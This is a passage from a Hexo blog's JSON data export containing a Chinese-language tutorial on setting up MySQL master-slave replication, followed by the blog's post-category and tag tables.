\n#  检查服务器状态 正常情况下Slave_SQL_Running_State是Replica has read all relay log;  waiting for more updates\nshow slave status \\G;\n```\n\n### 测试\n在主节点添加一条数据，再打开从节点对应的表，会发现已经同步好了","slug":"mysql主从复制","published":1,"updated":"2023-05-22T11:07:40.354Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clhyqubvt0000okvggzl5fw7p","content":"<h2 id=\"单节点问题\"><a href=\"#单节点问题\" class=\"headerlink\" title=\"单节点问题\"></a>单节点问题</h2><p>如果数据库是单节点，那么这台数据库如果宕机，那么就不能正常使用应用，还有可能丢失数据</p>\n<h2 id=\"mysql主从复制\"><a href=\"#mysql主从复制\" class=\"headerlink\" title=\"mysql主从复制\"></a>mysql主从复制</h2><h3 id=\"主节点配置\"><a href=\"#主节点配置\" class=\"headerlink\" title=\"主节点配置\"></a>主节点配置</h3><blockquote>\n<p>在主节点的配置文件<code>my.cnf</code>中的<code>[mysqld]</code>块中修改或者添加配置</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">server-id<span class=\"token operator\">=</span><span class=\"token number\">1</span>    <span class=\"token comment\"># 服务器 id，随意，但要唯一</span>\nlog-bin<span class=\"token operator\">=</span>mysql-bin   <span class=\"token comment\"># 二进制文件存放路径</span>\nbinlog-do-db<span class=\"token operator\">=</span>scada    <span class=\"token comment\"># 待同步的数据库日志</span>\nbinlog-ignore-db<span class=\"token operator\">=</span>mysql  <span class=\"token comment\"># 不同步的数据库日志</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>创建一个用户，特意为了主从复制使用</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 创建用户 我这里用户名为copyuser，注意这里的ip是从库服务器的ip</span>\nCREATE <span class=\"token environment constant\">USER</span> <span class=\"token string\">'alave'</span>@<span class=\"token string\">'%'</span> IDENTIFIED WITH mysql_native_password BY <span class=\"token string\">'alave'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 给主从复制账号授权</span>\ngrant replication slave on *.* to <span class=\"token string\">'alave'</span>@<span class=\"token string\">'%'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 刷新权限</span>\nFLUSH PRIVILEGES<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>重启mysql</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">service</span> mysql restart<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>登录mysql查看master信息</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">show master status<span class=\"token punctuation\">;</span> <span class=\"token comment\"># 这里面有一个Position，在配置从节点的时候会使用</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"配置从节点\"><a href=\"#配置从节点\" class=\"headerlink\" title=\"配置从节点\"></a>配置从节点</h3><blockquote>\n<p>在从节点的配置文件<code>my.cnf</code>中的<code>[mysqld]</code>块中修改或者添加配置</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">server-id<span class=\"token operator\">=</span><span class=\"token number\">2</span>    <span class=\"token comment\"># 服务器 id，随意，但要唯一</span>\nlog-bin<span class=\"token operator\">=</span>mysql-bin   <span class=\"token comment\"># 二进制文件存放路径</span>\nreplicate-do-db<span class=\"token operator\">=</span>scada    <span class=\"token comment\"># 待同步的数据库</span>\nreplicate-ignore-db<span class=\"token operator\">=</span>mysql,information_schema,performance_schema  <span class=\"token comment\"># 不同步的数据库</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote>\n<p>重启mysql</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">service</span> mysqld restart<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>登录mysql具体配置如下</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 登录mysql，然后执行后续代码</span>\nmysql <span class=\"token parameter variable\">-u</span> root -p密码\n<span class=\"token comment\"># 关闭从库</span>\nstop slave<span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 设置同步，注意这里是主库ip，日志名称和位置是我们之前上图中看到的名称和位置</span>\nchange master to <span class=\"token assign-left variable\">master_host</span><span class=\"token operator\">=</span><span class=\"token string\">'192.xx.xx.111'</span>,master_user<span class=\"token operator\">=</span><span class=\"token string\">'slave'</span>,master_password<span class=\"token operator\">=</span><span class=\"token string\">'slave'</span>,master_log_file<span class=\"token operator\">=</span><span class=\"token string\">'mysql-bin.000002'</span>,master_log_pos<span class=\"token operator\">=</span>xxx<span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 开启从库</span>\nstart slave<span class=\"token punctuation\">;</span> \n<span class=\"token comment\">#  检查服务器状态 正常情况下Slave_SQL_Running_State是Replica has read all relay log;  waiting for more updates</span>\nshow slave status <span class=\"token punctuation\">\\</span>G<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><p>在主节点添加一条数据，再打开从节点对应的表，会发现已经同步好了</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"单节点问题\"><a href=\"#单节点问题\" class=\"headerlink\" title=\"单节点问题\"></a>单节点问题</h2><p>如果数据库是单节点，那么这台数据库如果宕机，那么就不能正常使用应用，还有可能丢失数据</p>\n<h2 id=\"mysql主从复制\"><a href=\"#mysql主从复制\" class=\"headerlink\" title=\"mysql主从复制\"></a>mysql主从复制</h2><h3 id=\"主节点配置\"><a href=\"#主节点配置\" class=\"headerlink\" title=\"主节点配置\"></a>主节点配置</h3><blockquote>\n<p>在主节点的配置文件<code>my.cnf</code>中的<code>[mysqld]</code>块中修改或者添加配置</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">server-id<span class=\"token operator\">=</span><span class=\"token number\">1</span>    <span class=\"token comment\"># 服务器 id，随意，但要唯一</span>\nlog-bin<span class=\"token operator\">=</span>mysql-bin   <span class=\"token comment\"># 二进制文件存放路径</span>\nbinlog-do-db<span class=\"token operator\">=</span>scada    <span class=\"token comment\"># 待同步的数据库日志</span>\nbinlog-ignore-db<span class=\"token operator\">=</span>mysql  <span class=\"token comment\"># 不同步的数据库日志</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>创建一个用户，特意为了主从复制使用</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 创建用户 我这里用户名为copyuser，注意这里的ip是从库服务器的ip</span>\nCREATE <span class=\"token environment constant\">USER</span> <span class=\"token string\">'alave'</span>@<span class=\"token string\">'%'</span> IDENTIFIED WITH mysql_native_password BY <span class=\"token string\">'alave'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 给主从复制账号授权</span>\ngrant replication slave on *.* to <span class=\"token string\">'alave'</span>@<span class=\"token string\">'%'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 刷新权限</span>\nFLUSH PRIVILEGES<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>重启mysql</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">service</span> mysql restart<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>登录mysql查看master信息</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">show master status<span class=\"token punctuation\">;</span> <span class=\"token comment\"># 这里面有一个Position，在配置从节点的时候会使用</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"配置从节点\"><a href=\"#配置从节点\" class=\"headerlink\" title=\"配置从节点\"></a>配置从节点</h3><blockquote>\n<p>在从节点的配置文件<code>my.cnf</code>中的<code>[mysqld]</code>块中修改或者添加配置</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">server-id<span class=\"token operator\">=</span><span class=\"token number\">2</span>    <span class=\"token comment\"># 服务器 id，随意，但要唯一</span>\nlog-bin<span class=\"token operator\">=</span>mysql-bin   <span class=\"token comment\"># 二进制文件存放路径</span>\nreplicate-do-db<span class=\"token operator\">=</span>scada    <span class=\"token comment\"># 待同步的数据库</span>\nreplicate-ignore-db<span class=\"token operator\">=</span>mysql,information_schema,performance_schema  <span class=\"token comment\"># 不同步的数据库</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote>\n<p>重启mysql</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">service</span> mysqld restart<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote>\n<p>登录mysql具体配置如下</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 登录mysql，然后执行后续代码</span>\nmysql <span class=\"token parameter variable\">-u</span> root -p密码\n<span class=\"token comment\"># 关闭从库</span>\nstop slave<span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 设置同步，注意这里是主库ip，日志名称和位置是我们之前上图中看到的名称和位置</span>\nchange master to <span class=\"token assign-left variable\">master_host</span><span class=\"token operator\">=</span><span class=\"token string\">'192.xx.xx.111'</span>,master_user<span class=\"token operator\">=</span><span class=\"token string\">'slave'</span>,master_password<span class=\"token operator\">=</span><span class=\"token string\">'slave'</span>,master_log_file<span class=\"token operator\">=</span><span class=\"token string\">'mysql-bin.000002'</span>,master_log_pos<span class=\"token operator\">=</span>xxx<span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># 开启从库</span>\nstart slave<span class=\"token punctuation\">;</span> \n<span class=\"token comment\">#  检查服务器状态 正常情况下Slave_SQL_Running_State是Replica has read all relay log;  waiting for more updates</span>\nshow slave status <span class=\"token punctuation\">\\</span>G<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><p>在主节点添加一条数据，再打开从节点对应的表，会发现已经同步好了</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clcy469mn0001covgh6zq60to","category_id":"clcy469my0004covg3lxmfaba","_id":"clcy469n7000ccovgf6ws8d71"},{"post_id":"clcy469mu0003covggeohbi2n","category_id":"clcy469n50009covg09yq6ii2","_id":"clcy469na000gcovghw2g6cs0"},{"post_id":"clcy469n20007covge6l3b3v1","category_id":"clcy469n50009covg09yq6ii2","_id":"clcy469nb000icovghs9w2kj4"},{"post_id":"clcy8glkx000014vgdo08dv4e","category_id":"clcy8gll2000114vg0olfcq7q","_id":"clcy8gll5000414vgd6eshzzd"},{"post_id":"cld2uqf5u00001svk6huy2u4c","category_id":"cld2uqf6300021svk1v1pfjwo","_id":"cld2uqf6g000d1svkdcm8e1rf"},{"post_id":"cld2uqf6000011svk6hw34k0k","category_id":"cld2uqf6300021svk1v1pfjwo","_id":"cld2uqf6j000i1svk1ecca8t6"},{"post_id":"cld2uqf6h000f1svkh5atfjws","category_id":"cld2uqf6300021svk1v1pfjwo","_id":"cld2uqf6m000o1svk7zze1mr5"},{"post_id":"cld2uqf6600041svk69nrdz5r","category_id":"cld2uqf6f000c1svk6b245h1i","_id":"cld2uqf6o000s1svk84n66yyy"},{"post_id":"cld2uqf6i000h1svk7fxp9vu0","category_id":"cld2uqf6300021svk1v1pfjwo","_id":"cld2uqf6p000v1svkdngogwy4"},{"post_id":"cld2uqf6k000l1svkargs8pjk","category_id":"cld2uqf6300021svk1v1pfjwo","_id":"cld2uqf6r000y1svkeyhacpdl"},{"post_id":"cld2uqf6700051svk3x1qckjr","category_id":"cld2uqf6f000c1svk6b245h1i","_id":"cld2uqf6r00111svkgbx7bax3"},{"post_id":"cld2uqf6l000n1svk0sejhraj","category_id":"cld2uqf6300021svk1v1pfjwo","_id":"cld2uqf6s00131svk71or3qk1"},{"post_id":"cld2uqf6o000u1svkfys8d4fe","category_id":"cld2uqf6300021svk1v1pfjwo","_id":"cld2uqf6t00181svk1dqv6nya"},{"post_id":"cld2uqf6q000x1svk42f08a3r","category_id":"cld2uqf6300021svk1v1pfjwo","_id":"cld2uqf6u001a1svk6xmbgyw4"},{"post_id":"cld2uqf6d000a1svkganhgsee","category_id":"cld2uqf6f000c1svk6b245h1i","_id":"cld2uqf6u001c1svk6er97xms"},{"post_id":"cld2uqf6n000r1svk5k99231s","category_id":"cld2uqf6t00171svk0o0xg68t","_id":"cld2uqf6v001g1svkarcnhca6"},{"post_id":"cld2uqf6900061svkd4gebgfn","category_id":"cld2uqf6t00171svk0o0xg68t","_id":"cld3128ro0000ecvkbtdg3m65"},{"post_id":"cldcjex9g0000s8vk9mjt6dmi","category_id":"cld2uqf6t00171svk0o0xg68t","_id":"cldcjex9x0004s8vk3bhucbue"},{"post_id":"cldcjex9m0001s8vk2bqn6sqo","category_id":"cld2uqf6t00171svk0o0xg68t","_id":"cldcjex9y0005s8vk8pap9nvb"},{"post_id":"cldcjex9v0003s8vk1nakby5v","category_id":"cld2uqf6t00171svk0o0xg68t","_id":"cldcjex9z0008s8vkcr8rd507"},{"post_id":"cldljul8e00005kvg1pf0fc1n","category_id":"cld2uqf6f000c1svk6b245h1i","_id":"cldljul8l00025kvgfdkf2w19"},{"post_id":"cldlo7icd0000d4vg243wh6on","category_id":"cldlo7icj0001d4vgh4k58ate","_id":"cldlo7ico0004d4vgb6q3hpe0"},{"post_id":"cledy5z560000g0vg1v9u7ovs","category_id":"cledy5z5l0002g0vg146ta4mz","_id":"cledy5z5x0007g0vg0gbd8rm8"},{"post_id":"cledy5z5h0001g0vg3la73wni","category_id":"cledy5z5w0005g0vgetgv9qwr","_id":"cledy5z5y0008g0vggdw9c6y3"},{"post_id":"clefqud9r0000rovg0jryae8c","category_id":"clefqud9z0001rovgdxud5oxo","_id":"clefquda60004rovgfo5u4rln"},{"post_id":"cleqv9hzy0000usvg9u4w70j5","category_id":"cleqv9i050001usvgbrnudnj4","_id":"cleqv9i0d0004usvgao0ra1n9"},{"post_id":"cleqw6ccv00003gvggkpjd8nt","category_id":"cleqv9i050001usvgbrnudnj4","_id":"cleqw6cd100023gvg1buzcmr9"},{"post_id":"clf0wz5uu0000pgvg8azb09co","category_id":"clf0wz5v40002pgvghh2o9h38","_id":"clf0wz5vf0008pgvgdehp9oyb"},{"post_id":"clf0wz5v10001pgvgagvy3xak","category_id":"clf0wz5vd0005pgvg1bt523xu","_id":"clf0wz5vf000apgvg6d8w6l2y"},{"post_id":"clf0wz5vb0004pgvga1645hzk","category_id":"cld2uqf6t00171svk0o0xg68t","_id":"clf1y563h0001b8vg7okvcj7h"},{"post_id":"clf1y563q0006b8vg9xp52ceg","category_id":"cld2uqf6t00171svk0o0xg68t","_id":"clf1y563s0009b8vgfonv6a13"},{"post_id":"clf1y563o0003b8vg6snbaazw","category_id":"clf1y563p0004b8vg123pc16n","_id":"clf1y563s000ab8vge7wo19ui"},{"post_id":"clfaofk440000ssvgfbd01da4","category_id":"clfaofk4d0001ssvgggklbm7b","_id":"clfaofk4n0004ssvgdwnh13ko"},{"post_id":"clha679o80000ngr66uoof03c","category_id":"clf0wz5v40002pgvghh2o9h38","_id":"clha679od0002ngr63suwd7vb"},{"post_id":"clhgy9svv00000gvg4i1112pj","category_id":"clcy469my0004covg3lxmfaba","_id":"clhgy9swd00030gvghg8g4l7f"},{"post_id":"clhgy9swa00020gvgg03e96c0","category_id":"clcy469my0004covg3lxmfaba","_id":"clhgy9swf00080gvg04bo2xsd"},{"post_id":"clhgy9swe00050gvggjkmawl6","category_id":"clcy469my0004covg3lxmfaba","_id":"clhgy9swi000b0gvgbel02x78"},{"post_id":"clhgy9swf00070gvg7b111qv9","category_id":"clcy469my0004covg3lxmfaba","_id":"clhgy9swk000c0gvg0z1i4b0b"},{"post_id":"clhgy9swl000e0gvg89li2g8v","category_id":"clhgy9swm000f0gvga3oc4w9d","_id":"clhgy9swr000i0gvg2ob6ealw"},{"post_id":"clhrrgxrw00003svgc98ta548","category_id":"clcy469n50009covg09yq6ii2","_id":"clhrrgxs500023svg3bnd0vhr"},{"post_id":"clhu5r2190000ygvgfd2u4h0k","category_id":"clhu5r21b0001ygvg53zgbp8n","_id":"clhu5r21k0003ygvg0loa7fmm"},{"post_id":"clhyqubvt0000okvggzl5fw7p","category_id":"cld2uqf6t00171svk0o0xg68t","_id":"clhyqubvz0002okvg410v36dn"}],"PostTag":[{"post_id":"clcy469mn0001covgh6zq60to","tag_id":"clcy469n00005covg80d86gw0","_id":"clcy469n7000bcovgbtnrhhdw"},{"post_id":"clcy469mu0003covggeohbi2n","tag_id":"clcy469n5000acovgbaxmbuxg","_id":"clcy469n9000fcovg7owm15db"},{"post_id":"clcy469n20007covge6l3b3v1","tag_id":"clcy469n5000acovgbaxmbuxg","_id":"clcy469na000hcovg24qpet4t"},{"post_id":"clcy8glkx000014vgdo08dv4e","tag_id":"clcy8gll4000214vgdjee3hqi","_id":"clcy8gll5000314vg84e0ddu2"},{"post_id":"cld2uqf5u00001svk6huy2u4c","tag_id":"cld2uqf6500031svk0azq86zm","_id":"cld2uqf6c00091svk3gql5yvo"},{"post_id":"cld2uqf6000011svk6hw34k0k","tag_id":"cld2uqf6b00081svk1uewbwy0","_id":"cld2uqf6h000g1svkh23w7rix"},{"post_id":"cld2uqf6600041svk69nrdz5r","tag_id":"cld2uqf6g000e1svk9tw7ejjc","_id":"cld2uqf6l000m1svkfmfh0ek5"},{"post_id":"cld2uqf6700051svk3x1qckjr","tag_id":"cld2uqf6j000k1svken6eeywx","_id":"cld2uqf6o000t1svkex9m68pj"},{"post_id":"cld2uqf6900061svkd4gebgfn","tag_id":"cld2uqf6n000q1svk2m7beiec","_id":"cld2uqf6r00101svk1a4fdctr"},{"post_id":"cld2uqf6d000a1svkganhgsee","tag_id":"cld2uqf6r000z1svk9te01nu3","_id":"cld2uqf6t00161svkhz18gywf"},{"post_id":"cld2uqf6h000f1svkh5atfjws","tag_id":"cld2uqf6u00191svkd0rl8ha4","_id":"cld2uqf6v001f1svk6gjs35g0"},{"post_id":"cld2uqf6i000h1svk7fxp9vu0","tag_id":"cld2uqf6u00191svkd0rl8ha4","_id":"cld2uqf6w001i1svk9xhv8v74"},{"post_id":"cld2uqf6k000l1svkargs8pjk","tag_id":"cld2uqf6u00191svkd0rl8ha4","_id":"cld2uqf6w001k1svka4rlc1uj"},{"post_id":"cld2uqf6l000n1svk0sejhraj","tag_id":"cld2uqf6u00191svkd0rl8ha4","_id":"cld2uqf6x001m1svk8mmy4b00"},{"post_id":"cld2uqf6n000r1svk5k99231s","tag_id":"cld2uqf6w001l1svk1pd4etzw","_id":"cld2uqf6x001o1svkf8as6ysd"},{"post_id":"cld2uqf6o000u1svkfys8d4fe","tag_id":"cld2uqf6u00191svkd0rl8ha4","_id":"cld2uqf6y001q1svk3qoi5i3u"},{"post_id":"cld2uqf6q000x1svk42f08a3r","tag_id":"cld2uqf6u00191svkd0rl8ha4","_id":"cld2uqf6y001r1svk8atefz5i"},{"post_id":"cldcjex9g0000s8vk9mjt6dmi","tag_id":"cldcjex9p0002s8vk54ttdg75","_id":"cldcjex9z0007s8vk23off1pm"},{"post_id":"cldcjex9m0001s8vk2bqn6sqo","tag_id":"cldcjex9y0006s8vkf4ajgp5a","_id":"cldcjexa0000as8vkgfkf8zei"},{"post_id":"cldcjex9v0003s8vk1nakby5v","tag_id":"cldcjex9z0009s8vkgjdyf38z","_id":"cldcjexa0000bs8vkanu12qmt"},{"post_id":"cldljul8e00005kvg1pf0fc1n","tag_id":"cld2uqf6g000e1svk9tw7ejjc","_id":"cldljul8h00015kvgag63bbgn"},{"post_id":"cldlo7icd0000d4vg243wh6on","tag_id":"cldlo7icn0002d4vg4kz8dw8o","_id":"cldlo7ico0003d4vg89lffmb7"},{"post_id":"cledy5z560000g0vg1v9u7ovs","tag_id":"cldlo7icn0002d4vg4kz8dw8o","_id":"cledy5z5t0003g0vgc9xo3cyq"},{"post_id":"cledy5z5h0001g0vg3la73wni","tag_id":"cledy5z5u0004g0vg8bqybweb","_id":"cledy5z5x0006g0vgapd469jl"},{"post_id":"clefqud9r0000rovg0jryae8c","tag_id":"clefquda50002rovg582a7g1l","_id":"clefquda60003rovghj50h9jv"},{"post_id":"cleqv9hzy0000usvg9u4w70j5","tag_id":"cleqv9i0b0002usvg9qwh6uov","_id":"cleqv9i0c0003usvggdgc7fno"},{"post_id":"cleqw6ccv00003gvggkpjd8nt","tag_id":"cleqv9i0b0002usvg9qwh6uov","_id":"cleqw6cd100013gvg1giu6lme"},{"post_id":"clf0wz5uu0000pgvg8azb09co","tag_id":"clf0wz5va0003pgvg6qcf8ozf","_id":"clf0wz5ve0007pgvg1km84sms"},{"post_id":"clf0wz5v10001pgvgagvy3xak","tag_id":"clf0wz5ve0006pgvga6bwh1m7","_id":"clf0wz5vf0009pgvg9xiq3czr"},{"post_id":"clf0wz5vb0004pgvga1645hzk","tag_id":"clf1y563b0000b8vg1o863aac","_id":"clf1y563i0002b8vgbydf38s6"},{"post_id":"clf1y563o0003b8vg6snbaazw","tag_id":"clf1y563q0005b8vg9w5a9clq","_id":"clf1y563s0008b8vgby997ugv"},{"post_id":"clf1y563q0006b8vg9xp52ceg","tag_id":"clf1y563s0007b8vgen9cb9uj","_id":"clf1y563t000bb8vgd9me7lz7"},{"post_id":"clfaofk440000ssvgfbd01da4","tag_id":"clfaofk4m0002ssvg1fad3qvt","_id":"clfaofk4n0003ssvg7i5melpm"},{"post_id":"clha679o80000ngr66uoof03c","tag_id":"clf0wz5va0003pgvg6qcf8ozf","_id":"clha679od0001ngr651huawt2"},{"post_id":"clhgy9swa00020gvgg03e96c0","tag_id":"cld2uqf6r000z1svk9te01nu3","_id":"clhgy9swd00040gvgc02b72bh"},{"post_id":"clhgy9svv00000gvg4i1112pj","tag_id":"clhgy9sw300010gvg155m3evs","_id":"clhgy9swf00060gvg8q1l5bsx"},{"post_id":"clhgy9swf00070gvg7b111qv9","tag_id":"cld2uqf6w001l1svk1pd4etzw","_id":"clhgy9swh000a0gvgd0xt6wsc"},{"post_id":"clhgy9swe00050gvggjkmawl6","tag_id":"clhgy9swg00090gvggi5pgsv9","_id":"clhgy9swk000d0gvg4whn8axw"},{"post_id":"clhgy9swl000e0gvg89li2g8v","tag_id":"clhgy9swn000g0gvgfxn88bej","_id":"clhgy9swq000h0gvg1nr85627"},{"post_id":"clhrrgxrw00003svgc98ta548","tag_id":"clcy469n5000acovgbaxmbuxg","_id":"clhrrgxs500013svg6aykatzr"},{"post_id":"clhu5r2190000ygvgfd2u4h0k","tag_id":"cld2uqf6r000z1svk9te01nu3","_id":"clhu5r21j0002ygvg7fgifrf8"},{"post_id":"clhyqubvt0000okvggzl5fw7p","tag_id":"cldcjex9p0002s8vk54ttdg75","_id":"clhyqubvy0001okvg7npsemxy"}],"Tag":[{"name":"wifi","_id":"clcy469n00005covg80d86gw0"},{"name":"hexo","_id":"clcy469n5000acovgbaxmbuxg"},{"name":"cloud","_id":"clcy8gll4000214vgdjee3hqi"},{"name":"django","_id":"cld2uqf6500031svk0azq86zm"},{"name":"flask","_id":"cld2uqf6b00081svk1uewbwy0"},{"name":"fdfs","_id":"cld2uqf6g000e1svk9tw7ejjc"},{"name":"git","_id":"cld2uqf6j000k1svken6eeywx"},{"name":"mongo","_id":"cld2uqf6n000q1svk2m7beiec"},{"name":"nginx","_id":"cld2uqf6r000z1svk9te01nu3"},{"name":"-nginx -fdfs","_id":"cld2uqf6s00141svkcbsxabpi"},{"name":"basic","_id":"cld2uqf6u00191svkd0rl8ha4"},{"name":"redis","_id":"cld2uqf6w001l1svk1pd4etzw"},{"name":"nginx - fdfs","_id":"cld2zpb8s000054vk28z35tiw"},{"name":"mysql","_id":"cldcjex9p0002s8vk54ttdg75"},{"name":"DistributedTransactional","_id":"cldcjex9y0006s8vkf4ajgp5a"},{"name":"LocalTransactional","_id":"cldcjex9z0009s8vkgjdyf38z"},{"name":"面试","_id":"cldlo7icn0002d4vg4kz8dw8o"},{"name":"linux","_id":"cledy5z5u0004g0vg8bqybweb"},{"name":"postgresql","_id":"clefquda50002rovg582a7g1l"},{"name":"db","_id":"cleqv9i0b0002usvg9qwh6uov"},{"name":"os","_id":"clf0wz5va0003pgvg6qcf8ozf"},{"name":"storage","_id":"clf0wz5ve0006pgvga6bwh1m7"},{"name":"集群","_id":"clf1y563b0000b8vg1o863aac"},{"name":"interface","_id":"clf1y563q0005b8vg9w5a9clq"},{"name":"hot","_id":"clf1y563s0007b8vgen9cb9uj"},{"name":"minio","_id":"clfaofk4m0002ssvg1fad3qvt"},{"name":"maven","_id":"clhgy9sw300010gvg155m3evs"},{"name":"环境变量","_id":"clhgy9swg00090gvggi5pgsv9"},{"name":"spring-security","_id":"clhgy9swn000g0gvgfxn88bej"}]}}